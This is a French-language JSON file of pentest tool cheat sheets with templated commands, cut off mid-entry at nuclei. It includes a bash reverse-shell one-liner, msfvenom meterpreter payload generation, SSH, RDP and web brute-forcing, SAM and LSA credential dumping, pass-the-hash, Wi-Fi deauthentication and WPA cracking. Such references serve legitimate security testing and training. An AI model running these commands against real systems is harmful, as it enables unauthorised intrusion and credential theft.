{
  "cheatsheets": [
    {
      "tool": "nmap",
      "category": "Reconnaissance",
      "description": "Scanner de ports et de services réseau",
      "commands": [
        {"title": "Scan rapide top 1000 ports", "cmd": "nmap -T4 -F {TARGET}", "vars": ["TARGET"]},
        {"title": "Scan complet avec versions", "cmd": "nmap -sV -sC -p- {TARGET}", "vars": ["TARGET"]},
        {"title": "Détection OS + scripts", "cmd": "nmap -A -O {TARGET}", "vars": ["TARGET"]},
        {"title": "Scan SYN stealth", "cmd": "nmap -sS -p {PORTS} {TARGET}", "vars": ["PORTS","TARGET"]},
        {"title": "Scan UDP top 100", "cmd": "nmap -sU --top-ports 100 {TARGET}", "vars": ["TARGET"]},
        {"title": "Scripts vulnérabilités", "cmd": "nmap --script vuln {TARGET}", "vars": ["TARGET"]},
        {"title": "Script SMB vulnérabilités", "cmd": "nmap --script smb-vuln* -p 445 {TARGET}", "vars": ["TARGET"]},
        {"title": "Grab banners HTTP", "cmd": "nmap -sV --script=http-headers -p 80,443 {TARGET}", "vars": ["TARGET"]},
        {"title": "Export XML", "cmd": "nmap -oX {OUTPUT}.xml -sV {TARGET}", "vars": ["OUTPUT","TARGET"]},
        {"title": "Scan réseau CIDR", "cmd": "nmap -sn {TARGET}/24", "vars": ["TARGET"]},
        {"title": "Exclure des cibles", "cmd": "nmap {TARGET}/24 --exclude {EXCLUDE}", "vars": ["TARGET","EXCLUDE"]}
      ]
    },
    {
      "tool": "gobuster",
      "category": "Reconnaissance",
      "description": "Brute-force de répertoires et sous-domaines",
      "commands": [
        {"title": "Scan répertoires", "cmd": "gobuster dir -u http://{TARGET} -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
        {"title": "Scan sous-domaines", "cmd": "gobuster dns -d {TARGET} -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
        {"title": "Scan avec extensions", "cmd": "gobuster dir -u http://{TARGET} -w {WORDLIST} -x php,html,txt,bak", "vars": ["TARGET","WORDLIST"]},
        {"title": "Scan avec auth Basic", "cmd": "gobuster dir -u http://{TARGET} -w {WORDLIST} -U admin -P {PASSWORD}", "vars": ["TARGET","WORDLIST","PASSWORD"]},
        {"title": "VHOST fuzzing", "cmd": "gobuster vhost -u http://{TARGET} -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]}
      ]
    },
    {
      "tool": "ffuf",
      "category": "Reconnaissance",
      "description": "Fast web fuzzer pour répertoires, paramètres et VHOST",
      "commands": [
        {"title": "Fuzzing répertoires", "cmd": "ffuf -u http://{TARGET}/FUZZ -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
        {"title": "Fuzzing paramètre GET", "cmd": "ffuf -u http://{TARGET}?FUZZ=test -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
        {"title": "Fuzzing sous-domaines", "cmd": "ffuf -u http://{TARGET} -H \"Host: FUZZ.{TARGET}\" -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
        {"title": "Filtrer par code HTTP", "cmd": "ffuf -u http://{TARGET}/FUZZ -w {WORDLIST} -fc 404,403", "vars": ["TARGET","WORDLIST"]},
        {"title": "Fuzzing POST body", "cmd": "ffuf -u http://{TARGET}/login -X POST -d \"user=FUZZ&pass=test\" -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
        {"title": "Filtrer par taille de réponse", "cmd": "ffuf -u http://{TARGET}/FUZZ -w {WORDLIST} -fs {SIZE}", "vars": ["TARGET","WORDLIST","SIZE"]}
      ]
    },
    {
      "tool": "nikto",
      "category": "Reconnaissance",
      "description": "Scanner de vulnérabilités web",
      "commands": [
        {"title": "Scan basique", "cmd": "nikto -h http://{TARGET}", "vars": ["TARGET"]},
        {"title": "Scan avec port", "cmd": "nikto -h {TARGET} -p {PORT}", "vars": ["TARGET","PORT"]},
        {"title": "Scan HTTPS", "cmd": "nikto -h https://{TARGET} -ssl", "vars": ["TARGET"]},
        {"title": "Export rapport HTML", "cmd": "nikto -h http://{TARGET} -o report.html -Format html", "vars": ["TARGET"]},
        {"title": "Scan avec authentification", "cmd": "nikto -h http://{TARGET} -id admin:{PASSWORD}", "vars": ["TARGET","PASSWORD"]}
      ]
    },
    {
      "tool": "masscan",
      "category": "Reconnaissance",
      "description": "Scanner de ports ultra-rapide pour large surface",
      "commands": [
        {"title": "Scan top ports rapide", "cmd": "masscan {TARGET} -p 22,80,443,8080 --rate 1000", "vars": ["TARGET"]},
        {"title": "Scan tous ports", "cmd": "masscan {TARGET} -p 0-65535 --rate 10000", "vars": ["TARGET"]},
        {"title": "Scan réseau entier", "cmd": "masscan {TARGET}/24 -p 80,443 --rate 5000", "vars": ["TARGET"]},
        {"title": "Export JSON", "cmd": "masscan {TARGET} -p 1-1024 --rate 1000 -oJ scan.json", "vars": ["TARGET"]},
        {"title": "Bannière grabbing", "cmd": "masscan {TARGET} -p 80 --banners --rate 100", "vars": ["TARGET"]}
      ]
    },
    {
      "tool": "enum4linux-ng",
      "category": "Reconnaissance",
      "description": "Enumération de partages Windows/Samba/LDAP",
      "commands": [
        {"title": "Enum complète", "cmd": "enum4linux-ng -A {TARGET}", "vars": ["TARGET"]},
        {"title": "Enum utilisateurs", "cmd": "enum4linux-ng -U {TARGET}", "vars": ["TARGET"]},
        {"title": "Enum shares", "cmd": "enum4linux-ng -S {TARGET}", "vars": ["TARGET"]},
        {"title": "Enum avec creds", "cmd": "enum4linux-ng -u {USER} -p {PASSWORD} -A {TARGET}", "vars": ["USER","PASSWORD","TARGET"]},
        {"title": "Export YAML", "cmd": "enum4linux-ng -A {TARGET} -oY results.yaml", "vars": ["TARGET"]}
      ]
    },
    {
      "tool": "hydra",
      "category": "Exploitation",
      "description": "Outil de brute-force d'authentification multi-protocoles",
      "commands": [
        {"title": "Brute-force SSH", "cmd": "hydra -l {USER} -P {WORDLIST} ssh://{TARGET}", "vars": ["USER","WORDLIST","TARGET"]},
        {"title": "Brute-force FTP", "cmd": "hydra -l {USER} -P {WORDLIST} ftp://{TARGET}", "vars": ["USER","WORDLIST","TARGET"]},
        {"title": "Brute-force HTTP POST", "cmd": "hydra -l {USER} -P {WORDLIST} {TARGET} http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"", "vars": ["USER","WORDLIST","TARGET"]},
        {"title": "Brute-force RDP", "cmd": "hydra -l {USER} -P {WORDLIST} rdp://{TARGET}", "vars": ["USER","WORDLIST","TARGET"]},
        {"title": "Liste d'utilisateurs + mots de passe", "cmd": "hydra -L {USERLIST} -P {WORDLIST} ssh://{TARGET}", "vars": ["USERLIST","WORDLIST","TARGET"]}
      ]
    },
    {
      "tool": "sqlmap",
      "category": "Exploitation",
      "description": "Outil automatisé de détection et exploitation SQL injection",
      "commands": [
        {"title": "Test URL basique", "cmd": "sqlmap -u \"{TARGET}\" --batch", "vars": ["TARGET"]},
        {"title": "Dump base de données", "cmd": "sqlmap -u \"{TARGET}\" --dbs --batch", "vars": ["TARGET"]},
        {"title": "Dump tables d'une BDD", "cmd": "sqlmap -u \"{TARGET}\" -D {DB} --tables --batch", "vars": ["TARGET","DB"]},
        {"title": "Dump contenu d'une table", "cmd": "sqlmap -u \"{TARGET}\" -D {DB} -T {TABLE} --dump --batch", "vars": ["TARGET","DB","TABLE"]},
        {"title": "Test POST form", "cmd": "sqlmap -u \"{TARGET}\" --data=\"user=admin&pass=test\" --batch", "vars": ["TARGET"]},
        {"title": "Bypass WAF avec tamper", "cmd": "sqlmap -u \"{TARGET}\" --tamper=space2comment --batch", "vars": ["TARGET"]}
      ]
    },
    {
      "tool": "metasploit",
      "category": "Exploitation",
      "description": "Framework d'exploitation modulaire",
      "commands": [
        {"title": "Démarrer msfconsole", "cmd": "msfconsole -q", "vars": []},
        {"title": "Rechercher un exploit", "cmd": "search type:exploit name:{MODULE}", "vars": ["MODULE"]},
        {"title": "Utiliser un module", "cmd": "use {MODULE}", "vars": ["MODULE"]},
        {"title": "Configurer RHOSTS", "cmd": "set RHOSTS {TARGET}", "vars": ["TARGET"]},
        {"title": "Lancer l'exploit", "cmd": "run", "vars": []},
        {"title": "Générer payload msfvenom", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o payload.exe", "vars": ["LHOST","LPORT"]}
      ]
    },
    {
      "tool": "wpscan",
      "category": "Exploitation",
      "description": "Scanner de vulnérabilités WordPress",
      "commands": [
        {"title": "Scan basique", "cmd": "wpscan --url http://{TARGET}", "vars": ["TARGET"]},
        {"title": "Enum plugins", "cmd": "wpscan --url http://{TARGET} --enumerate p", "vars": ["TARGET"]},
        {"title": "Enum utilisateurs", "cmd": "wpscan --url http://{TARGET} --enumerate u", "vars": ["TARGET"]},
        {"title": "Brute-force comptes", "cmd": "wpscan --url http://{TARGET} -U {USER} -P {WORDLIST}", "vars": ["TARGET","USER","WORDLIST"]},
        {"title": "Scan avec API token", "cmd": "wpscan --url http://{TARGET} --api-token {TOKEN} --enumerate vp", "vars": ["TARGET","TOKEN"]}
      ]
    },
    {
      "tool": "crackmapexec",
      "category": "Post-Exploitation",
      "description": "Framework de pentest pour Active Directory et SMB",
      "commands": [
        {"title": "Enum SMB", "cmd": "crackmapexec smb {TARGET}", "vars": ["TARGET"]},
        {"title": "Brute-force SMB", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {WORDLIST}", "vars": ["TARGET","USER","WORDLIST"]},
        {"title": "Pass-the-Hash", "cmd": "crackmapexec smb {TARGET} -u {USER} -H {HASH}", "vars": ["TARGET","USER","HASH"]},
        {"title": "Enum shares", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {PASSWORD} --shares", "vars": ["TARGET","USER","PASSWORD"]},
        {"title": "Exécuter commande", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {PASSWORD} -x \"{CMD}\"", "vars": ["TARGET","USER","PASSWORD","CMD"]},
        {"title": "Dump SAM via SMB", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {PASSWORD} --sam", "vars": ["TARGET","USER","PASSWORD"]},
        {"title": "LSASS dump", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {PASSWORD} --lsa", "vars": ["TARGET","USER","PASSWORD"]},
        {"title": "WinRM access", "cmd": "crackmapexec winrm {TARGET} -u {USER} -p {PASSWORD}", "vars": ["TARGET","USER","PASSWORD"]}
      ]
    },
    {
      "tool": "theHarvester",
      "category": "OSINT",
      "description": "OSINT emails, sous-domaines, IPs depuis sources publiques",
      "commands": [
        {"title": "Récolte basique", "cmd": "theHarvester -d {TARGET} -b google", "vars": ["TARGET"]},
        {"title": "Multi-sources", "cmd": "theHarvester -d {TARGET} -b bing,google,yahoo,duckduckgo", "vars": ["TARGET"]},
        {"title": "Avec DNS brute-force", "cmd": "theHarvester -d {TARGET} -b all -n", "vars": ["TARGET"]},
        {"title": "Export XML", "cmd": "theHarvester -d {TARGET} -b google -f results", "vars": ["TARGET"]},
        {"title": "Shodan integration", "cmd": "theHarvester -d {TARGET} -b shodan", "vars": ["TARGET"]}
      ]
    },
    {
      "tool": "amass",
      "category": "OSINT",
      "description": "Cartographie de surface d'attaque et énumération de sous-domaines",
      "commands": [
        {"title": "Enum passive", "cmd": "amass enum -passive -d {TARGET}", "vars": ["TARGET"]},
        {"title": "Enum active", "cmd": "amass enum -active -d {TARGET}", "vars": ["TARGET"]},
        {"title": "Enum avec brute-force", "cmd": "amass enum -brute -d {TARGET} -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
        {"title": "Intel sur organisation", "cmd": "amass intel -org \"{ORG}\"", "vars": ["ORG"]},
        {"title": "Export JSON", "cmd": "amass enum -d {TARGET} -json {OUTPUT}.json", "vars": ["TARGET","OUTPUT"]},
        {"title": "Visualisation graphe", "cmd": "amass viz -d3 -d {TARGET}", "vars": ["TARGET"]}
      ]
    },
    {
      "tool": "shodan-cli",
      "category": "OSINT",
      "description": "Interroger Shodan depuis le terminal pour la recon passive",
      "commands": [
        {"title": "Info sur un host", "cmd": "shodan host {TARGET}", "vars": ["TARGET"]},
        {"title": "Recherche libre", "cmd": "shodan search \"{QUERY}\"", "vars": ["QUERY"]},
        {"title": "Votre IP publique", "cmd": "shodan myip", "vars": []},
        {"title": "Statistiques d'une requête", "cmd": "shodan stats \"{QUERY}\"", "vars": ["QUERY"]},
        {"title": "Télécharger résultats", "cmd": "shodan download {OUTPUT} \"{QUERY}\"", "vars": ["OUTPUT","QUERY"]},
        {"title": "Initialiser la clé API", "cmd": "shodan init {APIKEY}", "vars": ["APIKEY"]}
      ]
    },
    {
      "tool": "aircrack-ng",
      "category": "Réseau",
      "description": "Suite d'audit de sécurité Wi-Fi",
      "commands": [
        {"title": "Mode monitor", "cmd": "airmon-ng start {INTERFACE}", "vars": ["INTERFACE"]},
        {"title": "Capturer trafic", "cmd": "airodump-ng {INTERFACE}mon", "vars": ["INTERFACE"]},
        {"title": "Cibler un AP", "cmd": "airodump-ng -c {CHANNEL} --bssid {BSSID} -w capture {INTERFACE}mon", "vars": ["CHANNEL","BSSID","INTERFACE"]},
        {"title": "Déauth client", "cmd": "aireplay-ng -0 10 -a {BSSID} -c {CLIENT} {INTERFACE}mon", "vars": ["BSSID","CLIENT","INTERFACE"]},
        {"title": "Cracker WPA2", "cmd": "aircrack-ng -w {WORDLIST} capture-01.cap", "vars": ["WORDLIST"]}
      ]
    },
    {
      "tool": "netcat",
      "category": "Réseau",
      "description": "Couteau suisse réseau — connexions TCP/UDP, transferts, reverse shells",
      "commands": [
        {"title": "Écouter sur un port", "cmd": "nc -lvnp {PORT}", "vars": ["PORT"]},
        {"title": "Se connecter à un host", "cmd": "nc {TARGET} {PORT}", "vars": ["TARGET","PORT"]},
        {"title": "Banner grabbing", "cmd": "nc -v {TARGET} {PORT}", "vars": ["TARGET","PORT"]},
        {"title": "Transférer un fichier (envoi)", "cmd": "nc -lvnp {PORT} < {FILE}", "vars": ["PORT","FILE"]},
        {"title": "Transférer un fichier (réception)", "cmd": "nc {TARGET} {PORT} > {FILE}", "vars": ["TARGET","PORT","FILE"]},
        {"title": "Reverse shell bash", "cmd": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1", "vars": ["LHOST","LPORT"]},
        {"title": "Scan ports simple", "cmd": "nc -zv {TARGET} {PORTSTART}-{PORTEND}", "vars": ["TARGET","PORTSTART","PORTEND"]}
      ]
    },
    {
      "tool": "tcpdump",
      "category": "Réseau",
      "description": "Capture et analyse de paquets réseau en ligne de commande",
      "commands": [
        {"title": "Capturer sur interface", "cmd": "tcpdump -i {INTERFACE}", "vars": ["INTERFACE"]},
        {"title": "Filtrer par hôte", "cmd": "tcpdump -i {INTERFACE} host {TARGET}", "vars": ["INTERFACE","TARGET"]},
        {"title": "Filtrer par port", "cmd": "tcpdump -i {INTERFACE} port {PORT}", "vars": ["INTERFACE","PORT"]},
        {"title": "Sauvegarder en .pcap", "cmd": "tcpdump -i {INTERFACE} -w {FILE}.pcap", "vars": ["INTERFACE","FILE"]},
        {"title": "Lire une capture", "cmd": "tcpdump -r {FILE}.pcap", "vars": ["FILE"]},
        {"title": "HTTP uniquement", "cmd": "tcpdump -i {INTERFACE} -A port 80", "vars": ["INTERFACE"]},
        {"title": "Afficher ASCII + Hex", "cmd": "tcpdump -i {INTERFACE} -XX host {TARGET}", "vars": ["INTERFACE","TARGET"]}
      ]
    },
    {
      "tool": "john",
      "category": "Cracking",
      "description": "John the Ripper — cracker de mots de passe multi-formats",
      "commands": [
        {"title": "Crack basique (auto-detect)", "cmd": "john {HASHFILE}", "vars": ["HASHFILE"]},
        {"title": "Crack avec wordlist", "cmd": "john --wordlist={WORDLIST} {HASHFILE}", "vars": ["WORDLIST","HASHFILE"]},
        {"title": "Mode règles", "cmd": "john --wordlist={WORDLIST} --rules {HASHFILE}", "vars": ["WORDLIST","HASHFILE"]},
        {"title": "Format NTLM", "cmd": "john --format=NT --wordlist={WORDLIST} {HASHFILE}", "vars": ["WORDLIST","HASHFILE"]},
        {"title": "Crack hash SSH privée", "cmd": "ssh2john {KEYFILE} > hash.txt && john --wordlist={WORDLIST} hash.txt", "vars": ["KEYFILE","WORDLIST"]},
        {"title": "Crack ZIP protégé", "cmd": "zip2john {ZIPFILE} > hash.txt && john --wordlist={WORDLIST} hash.txt", "vars": ["ZIPFILE","WORDLIST"]},
        {"title": "Afficher mots de passe trouvés", "cmd": "john --show {HASHFILE}", "vars": ["HASHFILE"]}
      ]
    },
    {
      "tool": "volatility3",
      "category": "Forensic",
      "description": "Analyse de mémoire volatile (RAM dumps)",
      "commands": [
        {"title": "Info système", "cmd": "vol -f {DUMP} windows.info", "vars": ["DUMP"]},
        {"title": "Liste processus", "cmd": "vol -f {DUMP} windows.pslist", "vars": ["DUMP"]},
        {"title": "Arbre processus", "cmd": "vol -f {DUMP} windows.pstree", "vars": ["DUMP"]},
        {"title": "Connexions réseau", "cmd": "vol -f {DUMP} windows.netstat", "vars": ["DUMP"]},
        {"title": "Dump process", "cmd": "vol -f {DUMP} windows.dumpfiles --pid {PID}", "vars": ["DUMP","PID"]},
        {"title": "Malfind (code injecté)", "cmd": "vol -f {DUMP} windows.malfind", "vars": ["DUMP"]}
      ]
    },
    {
      "tool": "yara",
      "category": "Forensic",
      "description": "Moteur de règles pour détecter des patterns malveillants",
      "commands": [
        {"title": "Scan fichier", "cmd": "yara {RULES} {TARGET}", "vars": ["RULES","TARGET"]},
        {"title": "Scan répertoire récursif", "cmd": "yara -r {RULES} {TARGET}", "vars": ["RULES","TARGET"]},
        {"title": "Scan avec strings", "cmd": "yara -s {RULES} {TARGET}", "vars": ["RULES","TARGET"]},
        {"title": "Compiler règles", "cmd": "yarac {RULES} compiled.yrc", "vars": ["RULES"]},
        {"title": "Utiliser règles compilées", "cmd": "yara compiled.yrc {TARGET}", "vars": ["TARGET"]}
      ]
    },
    {
      "tool": "bash",
      "category": "Linux",
      "description": "Shell Bash — one-liners système, fichiers, processus et réseau",
      "commands": [
        {"title": "Rechercher fichiers par nom", "cmd": "find / -name \"{FILENAME}\" 2>/dev/null", "vars": ["FILENAME"]},
        {"title": "Fichiers avec bit SUID", "cmd": "find / -perm -4000 -type f 2>/dev/null", "vars": []},
        {"title": "Fichiers modifiés récemment", "cmd": "find {PATH} -mtime -{DAYS} -type f", "vars": ["PATH","DAYS"]},
        {"title": "Grep récursif insensible à la casse", "cmd": "grep -rin \"{PATTERN}\" {PATH}", "vars": ["PATTERN","PATH"]},
        {"title": "Surveiller un fichier log", "cmd": "tail -f {LOGFILE}", "vars": ["LOGFILE"]},
        {"title": "Connexions actives (ss)", "cmd": "ss -tulnp", "vars": []},
        {"title": "Processus triés par CPU", "cmd": "ps aux --sort=-%cpu | head -20", "vars": []},
        {"title": "Archiver un répertoire", "cmd": "tar -czf {ARCHIVE}.tar.gz {DIR}", "vars": ["ARCHIVE","DIR"]},
        {"title": "Extraire une archive", "cmd": "tar -xzf {ARCHIVE}.tar.gz -C {DEST}", "vars": ["ARCHIVE","DEST"]},
        {"title": "Crontab utilisateur", "cmd": "crontab -l", "vars": []},
        {"title": "Variables d'env filtrées", "cmd": "env | grep -i {PATTERN}", "vars": ["PATTERN"]},
        {"title": "Utilisation disque par dossier", "cmd": "du -sh {PATH}/* | sort -rh | head -20", "vars": ["PATH"]}
      ]
    },
    {
      "tool": "wget",
      "category": "Linux",
      "description": "Téléchargement de fichiers et mirroring de sites web",
      "commands": [
        {"title": "Télécharger un fichier", "cmd": "wget {URL}", "vars": ["URL"]},
        {"title": "Téléchargement silencieux nommé", "cmd": "wget -q -O {FILE} {URL}", "vars": ["FILE","URL"]},
        {"title": "Reprendre un téléchargement", "cmd": "wget -c {URL}", "vars": ["URL"]},
        {"title": "Mirror d'un site", "cmd": "wget -m -p --convert-links {URL}", "vars": ["URL"]},
        {"title": "Télécharger depuis une liste", "cmd": "wget -i {FILELIST}", "vars": ["FILELIST"]},
        {"title": "Limiter la vitesse", "cmd": "wget --limit-rate={RATE}k {URL}", "vars": ["RATE","URL"]},
        {"title": "Avec authentification basic", "cmd": "wget --user={USER} --password={PASS} {URL}", "vars": ["USER","PASS","URL"]}
      ]
    },
    {
      "tool": "jq",
      "category": "Linux",
      "description": "Parser, filtrer et transformer du JSON en ligne de commande",
      "commands": [
        {"title": "Formater JSON (pretty)", "cmd": "cat {FILE} | jq '.'", "vars": ["FILE"]},
        {"title": "Extraire un champ", "cmd": "cat {FILE} | jq '.{FIELD}'", "vars": ["FILE","FIELD"]},
        {"title": "Lister clés d'un objet", "cmd": "cat {FILE} | jq 'keys'", "vars": ["FILE"]},
        {"title": "Compter les éléments", "cmd": "cat {FILE} | jq '. | length'", "vars": ["FILE"]},
        {"title": "Filtrer un tableau", "cmd": "cat {FILE} | jq '.[] | select(.status==\"{VALUE}\")'", "vars": ["FILE","VALUE"]},
        {"title": "Extraire champs multiples", "cmd": "cat {FILE} | jq '.[] | {name:.name, id:.id}'", "vars": ["FILE"]},
        {"title": "Pipe avec curl", "cmd": "curl -s {URL} | jq '.{FIELD}'", "vars": ["URL","FIELD"]},
        {"title": "Output compact", "cmd": "cat {FILE} | jq -c '.[]'", "vars": ["FILE"]}
      ]
    },
    {
      "tool": "curl",
      "category": "Web",
      "description": "Requêtes HTTP/S — API, auth, upload et debug depuis le terminal",
      "commands": [
        {"title": "GET simple", "cmd": "curl -s {URL}", "vars": ["URL"]},
        {"title": "Afficher headers de réponse", "cmd": "curl -I {URL}", "vars": ["URL"]},
        {"title": "POST JSON", "cmd": "curl -s -X POST {URL} -H \"Content-Type: application/json\" -d '{DATA}'", "vars": ["URL","DATA"]},
        {"title": "Avec token Bearer", "cmd": "curl -s -H \"Authorization: Bearer {TOKEN}\" {URL}", "vars": ["URL","TOKEN"]},
        {"title": "Télécharger fichier", "cmd": "curl -sO {URL}", "vars": ["URL"]},
        {"title": "Suivre les redirections", "cmd": "curl -sL {URL}", "vars": ["URL"]},
        {"title": "Ignorer certificat TLS", "cmd": "curl -sk {URL}", "vars": ["URL"]},
        {"title": "Upload fichier multipart", "cmd": "curl -F \"file=@{FILE}\" {URL}", "vars": ["FILE","URL"]},
        {"title": "Custom User-Agent", "cmd": "curl -s -A \"{USERAGENT}\" {URL}", "vars": ["URL","USERAGENT"]},
        {"title": "Via proxy HTTP", "cmd": "curl -s -x http://{PROXY} {URL}", "vars": ["PROXY","URL"]},
        {"title": "Timing détaillé", "cmd": "curl -s -o /dev/null -w \"dns:%{time_namelookup} connect:%{time_connect} total:%{time_total}\" {URL}", "vars": ["URL"]}
      ]
    },
    {
      "tool": "nuclei",
      "category": "Web",
      "description": "Scanner de vulnérabilités basé sur templates YAML communautaires",
      "commands": [
        {"title": "Scan basique", "cmd": "nuclei -u {TARGET}", "vars": ["TARGET"]},
